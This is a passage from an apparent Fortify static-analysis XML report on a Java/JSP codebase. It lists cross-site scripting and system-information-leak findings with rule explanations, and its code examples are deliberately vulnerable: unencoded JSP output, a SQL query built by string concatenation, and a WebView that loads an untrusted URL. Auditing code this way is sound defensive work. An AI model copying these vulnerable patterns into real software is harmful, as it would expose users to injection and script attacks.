The code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.

Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL which causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.


Example 2: The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;%= name %&gt;



As in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.

Some think that in the mobile environment, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.

Example 3: The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(url);
...


If the value of url starts with javascript:, JavaScript code that follows executes within the context of the web page inside WebView.

As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:

- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.

- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.

- As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.


A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The solution to XSS is to ensure that validation occurs in the correct places and checks are made for the correct properties.

Because XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.

Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.

The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.

A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:

In the content of a block-level element (in the middle of a paragraph of text):

- "&lt;" is special because it introduces a tag.

- "&amp;" is special because it introduces a character entity.

- "&gt;" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening "&lt;", but omitted it in error.

The following principles apply to attribute values:

- In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value.

- In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value.

- In attribute values without any quotes, white-space characters, such as space and tab, are special.

- "&amp;" is special when used with certain attributes, because it introduces a character entity.

In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:

- Space, tab, and new line are special because they mark the end of the URL.

- "&amp;" is special because it either introduces a character entity or separates CGI parameters.

- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.

- The "%" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, "%" must be filtered if input such as "%68%65%6C%6C%6F" becomes "hello" when it appears on the web page in question.


Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:

- Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag.

Server-side scripts:

- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (") on output might require additional filtering.

Other possibilities:

- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).

After you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.

If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].

Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database.

2. Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities.

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>561</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="F461C17448A7ED55540AB7D045E4B460" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method doStartTag() in DisplayMsgTag.java sends unvalidated data to a web browser on line 84, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DisplayMsgTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/DisplayMsgTag.java</FilePath>
<LineStart>84</LineStart>
<Snippet>                if (b_objReqAppMsgBean != null)
                    setMessages(b_objReqAppMsgBean, b_bufWarnings, b_bufInfo);
                m_outJspWriter.println(b_bufWarnings.toString());
                m_outJspWriter.println(b_bufInfo.toString());
                b_bufWarnings = null;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>906</LineStart>
<Snippet>        {
            //if the oeprator is not between, return as it is from request object.
            l_objRetFilterValue = (String) p_reqRequest.getParameter(p_sFilter);
        }
        //end of else-if(p_sOperator.equalsIgnoreCase("BETWEEN") ||</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9597891FDDBBF4F52CC0D31CCC402629" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method doStartTag() in DisplayMsgTag.java sends unvalidated data to a web browser on line 84, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DisplayMsgTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/DisplayMsgTag.java</FilePath>
<LineStart>84</LineStart>
<Snippet>                if (b_objReqAppMsgBean != null)
                    setMessages(b_objReqAppMsgBean, b_bufWarnings, b_bufInfo);
                m_outJspWriter.println(b_bufWarnings.toString());
                m_outJspWriter.println(b_bufInfo.toString());
                b_bufWarnings = null;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>249</LineStart>
<Snippet>        try
        {
            l_sGridName = p_reqRequest.getParameter(GRID_NAME);
            l_enmParameterNames = p_reqRequest.getParameterNames();
            boolean isFld=false;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C929D0EDBF3D90110D5A1C80D6689F26" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method doStartTag() in DisplayMsgTag.java sends unvalidated data to a web browser on line 84, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DisplayMsgTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/DisplayMsgTag.java</FilePath>
<LineStart>84</LineStart>
<Snippet>                if (b_objReqAppMsgBean != null)
                    setMessages(b_objReqAppMsgBean, b_bufWarnings, b_bufInfo);
                m_outJspWriter.println(b_bufWarnings.toString());
                m_outJspWriter.println(b_bufInfo.toString());
                b_bufWarnings = null;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>389</LineStart>
<Snippet>                        else
                        {
                            l_sElementValue = p_reqRequest.getParameter(l_sElementName);
                            if(l_sElementValue==null) l_sElementValue = p_reqRequest.getParameter(l_sOrgElementName);
                            </Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D38B3E3A0647D8434C7ED6053F012E95" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method doStartTag() in DisplayMsgTag.java sends unvalidated data to a web browser on line 84, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DisplayMsgTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/DisplayMsgTag.java</FilePath>
<LineStart>84</LineStart>
<Snippet>                if (b_objReqAppMsgBean != null)
                    setMessages(b_objReqAppMsgBean, b_bufWarnings, b_bufInfo);
                m_outJspWriter.println(b_bufWarnings.toString());
                m_outJspWriter.println(b_bufInfo.toString());
                b_bufWarnings = null;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EHRRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/EHRRequestHandler.java</FilePath>
<LineStart>51</LineStart>
<Snippet>    	try {
    		String m_sUserLoginID = p_objRequest.getParameter("fhdn&amp;UserId");
    		String m_sUserDomainID = p_objRequest.getParameter("fhdn&amp;DomainName");
    		String m_sUserProfileId = p_objRequest.getParameter("fhdn&amp;ProfileId");
    		String m_sUserProfileName = p_objRequest.getParameter("fhdn&amp;ProfileName");</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="51929C4C08C8F65F96EF89CE2375BEDD" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method doStartTag() in DisplayMsgTag.java sends unvalidated data to a web browser on line 84, which can result in the browser executing malicious code.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DisplayMsgTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/DisplayMsgTag.java</FilePath>
<LineStart>84</LineStart>
<Snippet>                if (b_objReqAppMsgBean != null)
                    setMessages(b_objReqAppMsgBean, b_bufWarnings, b_bufInfo);
                m_outJspWriter.println(b_bufWarnings.toString());
                m_outJspWriter.println(b_bufInfo.toString());
                b_bufWarnings = null;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>RequestSessionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/RequestSessionUtil.java</FilePath>
<LineStart>838</LineStart>
<Snippet>        {
            //since it is a range operator, get the values from request as string array.
            l_objRetFilterValue = p_reqRequest.getParameterValues(p_sFilter);
            List l_lstList = CollectionUtil.convertStringArrayToList((String[]) l_objRetFilterValue);
            /*if(l_lstList.size() &lt; 2)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="542">
                        <groupTitle>System Information Leak</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function main() in ActionMapper.java reveals system data or debug information by calling printStackTrace() on line 1092. The information revealed by printStackTrace() could help an adversary form a plan of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An information leak occurs when system data or debug information leaves the program through an output stream or logging function.



Example 1: The following code writes an exception to the standard error stream:


try {
    ...
} catch (Exception e) {
    e.printStackTrace();
}


Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from "Standard error" or "Standard output" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a "syslog" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.

In some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.

Here is another scenario, specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication.

Example 2: The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range.

...
public static final String TAG = "NfcActivity";
private static final String DATA_SPLITTER = "__:DATA:__";
private static final String MIME_TYPE = "application/my.applications.mimetype";
...
public NdefMessage createNdefMessage(NfcEvent event) {
    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);
    String VERSION = tm.getDeviceSoftwareVersion();
    String text = TAG + DATA_SPLITTER + VERSION;
    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,
            MIME_TYPE.getBytes(), new byte[0], text.getBytes());
    NdefRecord[] records = { record };
    NdefMessage msg = new NdefMessage(records);
    return msg;
}
...


NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper. In Example 2, Fortify Static Code Analyzer reports a System Information Leak vulnerability on the return statement.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).

Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an "Access Denied" message can reveal that a file or user exists on the system.

If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Do not include system data in the messages pushed to other devices in range, encrypt the payload of the message, or establish a secure communication channel at a higher layer.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own.

2. This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use Audit Guide to filter out this category from your scan results.

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>542</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3F2A71D3E93CDF1FD93991BF59B44437" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function safeClose() in CNSIEditorBean.java reveals system data or debug information by calling printStackTrace() on line 525. The information revealed by printStackTrace() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>525</LineStart>
<Snippet>				fis.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C69E2512B7710AB1959D6E0CA3A9C8DF" ruleID="2B94F72B-9EF6-4260-A2F8-81B2BDA26B9F">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function insertSingleRecord() in DbUtilImpl.java reveals system data or debug information by calling InvalidArguementException() on line 3220. The information revealed by InvalidArguementException() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>3220</LineStart>
<Snippet>        {
            throw new InvalidArguementException("insertSingleRecord  parameters is null " +
                    "p_sTableName = " + p_sTableName + " p_sTableName = " + p_mapDataHash +
                    " p_conDbConn = " + p_conDbConn);
        }</Snippet>
<TargetFunction>com.cnsi.exception.InvalidArguementException.InvalidArguementException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>466</LineStart>
<Snippet>            l_objSecAuditData.m_sAuditLkPCD = p_sAuditLkpcd;
            l_objSecAuditData.m_sClientIP = p_sClientIP;
            l_objSecAuditData.m_sSessionID = p_sCurSession.getId();
            l_objSecAuditData.m_sAuditRemarks = p_sAuditRemarks;
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.getId()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="048F4DC584B66E27ECF5CB1B68CB6522" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in ActionMapper.java reveals system data or debug information by calling printStackTrace() on line 1092. The information revealed by printStackTrace() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1092</LineStart>
<Snippet>    catch (Exception e)
    {
      e.printStackTrace();
      System.out.println("Error during creation: " + e.getMessage());
    } //catch</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4A6C63A34A5718DFACE54691151753E4" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in DateConverter.java reveals system data or debug information by calling printStackTrace() on line 770. The information revealed by printStackTrace() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>770</LineStart>
<Snippet>        catch (Exception ex)
        {
            ex.printStackTrace();
        }
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="44F3E48CB35B01D9647644E64732F665" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The function main() in CNSIEditorBean.java reveals system data or debug information by calling printStackTrace() on line 510. The information revealed by printStackTrace() could help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>510</LineStart>
<Snippet>			System.exit(0);
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			// Close the input stream</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="500">
                        <groupTitle>Cross-Site Scripting: Poor Validation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method _jspService() in adminindex.jsp uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The use of certain encoding constructs, such as the &lt;c:out/&gt; tag with the escapeXml="true" attribute (the default behavior), prevents some, but not all cross-site scripting attacks. Depending on the context in which the data appear, characters beyond the basic &lt;, &gt;, &amp;, and " that are HTML-encoded and those beyond &lt;, &gt;, &amp;, ", and ' that are XML-encoded might take on meta-meaning. Relying on such encoding constructs is equivalent to using a weak blacklist to prevent cross-site scripting and might allow an attacker to inject malicious code that will be executed in the browser. Because accurately identifying the context in which the data appear statically is not always possible, Fortify Static Code Analyzer reports cross-site scripting findings even when encoding is applied and presents them as Cross-Site Scripting: Poor Validation issues.

Cross-site scripting (XSS) vulnerabilities occur when:

1. Data enters a web application through an untrusted source. In the case of reflected XSS, an untrusted source is most frequently a web request, and in the case of persistent (also known as stored) XSS -- it is the results of a database query.


2. The data is included in dynamic content that is sent to a web user without validation.

The malicious content sent to the web browser often takes the form of a segment of JavaScript, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.


Example 1: The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user via the &lt;c:out/&gt; tag.


Employee ID: &lt;c:out value="${param.eid}"/&gt;



The code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.

Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL which causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.


Example 2: The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the &lt;c:out/&gt; tag.


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;c:out value="${name}"/&gt;




As in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.

Some think that in the mobile environment, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.

Example 3: The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(URLEncoder.encode(url));
...


If the value of url starts with javascript:, JavaScript code that follows executes within the context of the web page inside WebView.

As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:

- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.

- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.

